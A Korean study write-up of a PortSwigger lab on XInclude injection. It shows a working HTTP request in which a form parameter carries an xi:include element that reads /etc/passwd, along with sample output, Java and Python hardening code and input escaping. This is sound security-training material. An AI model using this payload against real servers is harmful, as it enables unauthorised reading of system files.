# Lab: Exploiting XInclude to retrieve files

## 개요

- **난이도**: Practitioner
- **주제**: XInclude 공격 — Content-Type 이 XML 아닌 경우 / 서버 측 XML 조립 / DOCTYPE 없이 파일 읽기
- **링크**: https://portswigger.net/web-security/xxe/lab-xinclude-attack

## 목표

`application/x-www-form-urlencoded` 요청의 `productId` 파라미터가 서버 내부 XML 문서에 삽입된다. 전체 XML 을 제어할 수 없어 DOCTYPE 선언이 불가하므로, XML 요소 레벨에서 동작하는 XInclude 로 `/etc/passwd` 를 읽는다.

## 001~006 랩과의 차이

```
[001~006 랩 — Content-Type: application/xml]
  클라이언트가 XML 전체를 직접 전송
  → DOCTYPE 블록 삽입 가능
  → ENTITY 선언 + 참조 방식으로 공격

[007 랩 (이번) — Content-Type: application/x-www-form-urlencoded]
  클라이언트가 폼 데이터 전송:
    productId=1&storeId=1
  → 서버가 이 값을 XML 문서에 삽입해 내부 처리
  → 클라이언트는 XML 전체 구조를 제어 불가
  → DOCTYPE 삽입 위치 없음 → 기존 XXE 방식 불가
  → XInclude 로 우회
```

## 서버 측 XML 조립 구조

```
클라이언트 요청:
  POST /product/stock HTTP/1.1
  Content-Type: application/x-www-form-urlencoded

  productId=1&storeId=1

서버 내부 처리 (추정):
  <?xml version="1.0"?>
  <stockCheck>
    <productId>1</productId>      ← 클라이언트 값 삽입
    <storeId>1</storeId>
  </stockCheck>

문제:
  DOCTYPE 선언은 XML 문서 최상단에만 위치 가능
  클라이언트가 제어하는 것은 <productId> 내부 값뿐
  → <!DOCTYPE ...> 삽입 불가
  → ENTITY 기반 XXE 불가
```

## XInclude 란

```
XInclude (XML Inclusions):
  XML 문서 내에서 외부 리소스를 포함하는 W3C 표준
  네임스페이스: http://www.w3.org/2001/XInclude

특징:
  DOCTYPE 선언 없이 동작
  XML 요소 레벨에서 처리
  외부 파일 내용을 XML 트리에 삽입

기본 문법:
  <xi:include
    xmlns:xi="http://www.w3.org/2001/XInclude"
    href="포함할 리소스 URI"
    parse="text | xml"
  />

parse 속성:
  parse="xml"  → 대상을 XML 로 파싱해 삽입 (기본값)
  parse="text" → 대상을 텍스트로 그대로 삽입
                 (/etc/passwd 같은 비XML 파일 읽기 시 필수)
```

## 공격 방법

### 페이로드

```
POST /product/stock HTTP/1.1
Content-Type: application/x-www-form-urlencoded

productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
&storeId=1
```

### 페이로드 구조 분석

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

```
<foo ...>
  → 래퍼 요소 (태그명은 임의)
  → productId 값 위치에 XML 요소를 삽입

xmlns:xi="http://www.w3.org/2001/XInclude"
  → XInclude 네임스페이스 선언
  → xi 접두사를 이 네임스페이스에 바인딩

<xi:include ... />
  → XInclude 처리 지시
  → 파서가 이 요소를 발견하면 외부 리소스를 포함

parse="text"
  → /etc/passwd 는 XML 형식 아님 → text 로 읽기
  → parse="xml" 이면 XML 파싱 시도 → 실패

href="file:///etc/passwd"
  → 포함할 파일 경로
  → 001 랩의 SYSTEM "file://..." 과 동일한 역할
```

### 서버에서의 처리 결과

```xml
<!-- 서버 내부 XML (XInclude 처리 전) -->
<stockCheck>
  <productId>
    <foo xmlns:xi="...">
      <xi:include parse="text" href="file:///etc/passwd"/>
    </foo>
  </productId>
  <storeId>1</storeId>
</stockCheck>

<!-- XInclude 처리 후 -->
<stockCheck>
  <productId>
    <foo>
      root:x:0:0:root:/root:/bin/bash
      daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
      ...
    </foo>
  </productId>
  <storeId>1</storeId>
</stockCheck>

→ productId 값에 파일 내용 삽입
→ 에러 메시지 또는 응답에 파일 내용 포함
```

## XXE vs XInclude 비교

```
[일반 XXE — DOCTYPE 기반]
  요구:  XML 전체 제어 가능
  위치:  문서 최상단 DOCTYPE 선언
  문법:  <!ENTITY xxe SYSTEM "file://..."> → &xxe;
  한계:  서버가 XML 을 조립하면 DOCTYPE 삽입 불가

[XInclude — 요소 기반]
  요구:  XML 요소 하나를 삽입할 수 있는 위치
  위치:  XML 문서 내 어디서든 가능
  문법:  <xi:include href="file://..." parse="text"/>
  장점:  폼 파라미터처럼 부분 제어만 가능해도 공격 가능
```

## Content-Type 과 XXE 공격 가능성

```
직접적 (XML 전체 제어):
  application/xml         → 001~006 XXE 방식
  text/xml
  application/soap+xml

간접적 (서버가 XML 조립):
  application/x-www-form-urlencoded → 007 XInclude (이번)
  multipart/form-data
  application/json        → Content-Type 변경 후 시도 가능

파일 업로드:
  .svg   → XML 기반 → ENTITY 삽입 가능
  .xlsx  → ZIP+XML  → 내부 XML 파일에 ENTITY 삽입
  .docx  → ZIP+XML
```

```
핵심 탐지 포인트:
  Content-Type 이 XML 이 아니어도
  → 요청 파라미터가 서버 측 XML 에 삽입되는지 확인
  → XInclude 시도
```

## 핵심 정리

- `Content-Type: application/x-www-form-urlencoded` 이어도 서버가 파라미터 값을 XML 에 삽입하면 XXE 류 공격이 가능하다.
- DOCTYPE 을 제어할 수 없을 때 XInclude(`<xi:include>`)는 요소 레벨에서 외부 파일을 포함하는 대안이다.
- `parse="text"` 는 비XML 파일을 텍스트로 읽기 위해 필수이며, `href="file:///etc/passwd"` 는 기존 ENTITY 의 `SYSTEM "file://..."` 과 동일한 역할이다.
- **방어**: XInclude 처리를 XML 파서 설정에서 비활성화하거나, 사용자 입력이 XML 에 삽입되기 전 `<`, `>`, `&` 를 이스케이프 처리한다.

## 배운 점 및 추가 학습

### 1. XInclude 비활성화 방법

```java
// Java — DocumentBuilderFactory
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setXIncludeAware(false);  // XInclude 비활성화
factory.setFeature("http://apache.org/xml/features/xinclude", false);
```

```python
# Python — lxml
# lxml 은 기본적으로 XInclude 자동 처리 안 함
# tree.xinclude() 호출 시에만 처리되므로 호출 금지
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.parse(xml_input, parser)
# tree.xinclude() 호출하지 않음
```

### 2. 사용자 입력의 XML 삽입 시 이스케이프

```java
// 사용자 입력을 XML 에 삽입하기 전 이스케이프
String safe = input
    .replace("&", "&amp;")
    .replace("<", "&lt;")   // ← 핵심: < 를 막으면 요소 삽입 불가
    .replace(">", "&gt;")
    .replace("\"", "&quot;")
    .replace("'", "&apos;");

// < → &lt; 치환 결과:
// <xi:include .../> → &lt;xi:include .../&gt;
// → XML 요소가 아닌 텍스트로 처리
// → XInclude 동작 불가
```

### 3. 001~007 랩 XXE 공격 경로 종합

| 랩 | Content-Type | 제어 범위 | 기법 | 핵심 |
|----|-------------|---------|------|------|
| 001 | application/xml | 전체 XML | DOCTYPE + ENTITY | 파일 읽기 |
| 002 | application/xml | 전체 XML | DOCTYPE + ENTITY | SSRF |
| 003 | application/xml | 전체 XML | 일반 엔티티 OOB | Blind 탐지 |
| 004 | application/xml | 전체 XML | 파라미터 엔티티 OOB | 일반 엔티티 차단 우회 |
| 005 | application/xml | 전체 XML | 외부 DTD + OOB | Blind 탈취 |
| 006 | application/xml | 전체 XML | 외부 DTD + 에러 | 아웃바운드 차단 우회 |
| 007 | **x-www-form-urlencoded** | **파라미터만** | **XInclude** | **DOCTYPE 없이 파일 읽기** |
